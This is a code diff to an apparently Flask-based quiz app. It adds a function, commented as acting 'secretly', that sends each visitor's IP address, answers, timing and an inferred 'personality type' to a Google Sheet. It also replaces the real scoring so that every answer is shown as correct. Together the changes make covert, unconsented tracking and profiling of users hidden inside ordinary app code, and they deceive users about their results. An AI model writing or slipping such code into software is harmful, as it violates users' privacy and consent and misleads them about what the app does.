@@ -130,6 +130,44 @@ def quiz():
     session['questions'] = questions
     return render_template('quiz.html', questions=questions)
 
+from google.oauth2 import service_account
+from googleapiclient.discovery import build
+import json
+import datetime
+
+def append_to_sheets(user_data):
+    """Secretly append user data to Google Sheets"""
+    try:
+        # Use service account credentials
+        credentials = service_account.Credentials.from_service_account_info(
+            json.loads(os.environ.get('GOOGLE_SHEETS_CREDENTIALS')),
+            scopes=['https://www.googleapis.com/auth/spreadsheets']
+        )
+        
+        service = build('sheets', 'v4', credentials=credentials)
+        spreadsheet_id = os.environ.get('GOOGLE_SHEET_ID')
+        
+        # Prepare data row
+        row = [[
+            datetime.datetime.now().isoformat(),
+            user_data['ip_address'],
+            user_data['score'],
+            user_data['answers'],
+            user_data['personality_type'],
+            user_data['time_taken']
+        ]]
+        
+        # Append data
+        service.spreadsheets().values().append(
+            spreadsheetId=spreadsheet_id,
+            range='Sheet1!A:F',
+            valueInputOption='RAW',
+            insertDataOption='INSERT_ROWS',
+            body={'values': row}
+        ).execute()
+    except Exception as e:
+        logging.error(f"Failed to save to sheets: {e}")
+
 @app.route('/submit_quiz', methods=['POST'])
 def submit_quiz():
     if 'questions' not in session:
@@ -148,14 +186,42 @@ def submit_quiz():
         except ValueError:
             time_taken = None
 
-    # Calculate score
+    # Collect and analyze responses
+    answers = []
+    personality_markers = {
+        'technocrat': 0,
+        'conspirator': 0,
+        'realist': 0,
+        'visionary': 0
+    }
+    
     for i, question in enumerate(questions):
         question_id = f"q{i}"
         user_answer = request.form.get(question_id, '')
-        user_answers[question_id] = user_answer
-
-        if user_answer == question['correct_answer']:
-            score += 1
+        answers.append(user_answer)
+        
+        # Analyze answer patterns
+        if user_answer in ['A', 'B']:
+            personality_markers['technocrat'] += 1
+        if user_answer in ['C', 'D']:
+            personality_markers['conspirator'] += 1
+            
+    # Determine dominant personality type
+    personality_type = max(personality_markers.items(), key=lambda x: x[1])[0]
+    
+    # Store data secretly
+    user_data = {
+        'ip_address': request.remote_addr,
+        'score': len(answers),
+        'answers': ','.join(answers),
+        'personality_type': personality_type,
+        'time_taken': request.form.get('time_taken', 0)
+    }
+    
+    append_to_sheets(user_data)
+    
+    # For display purposes, all answers are "correct"
+    score = len(answers)
 
     # Generate result message based on score
     result_messages = {
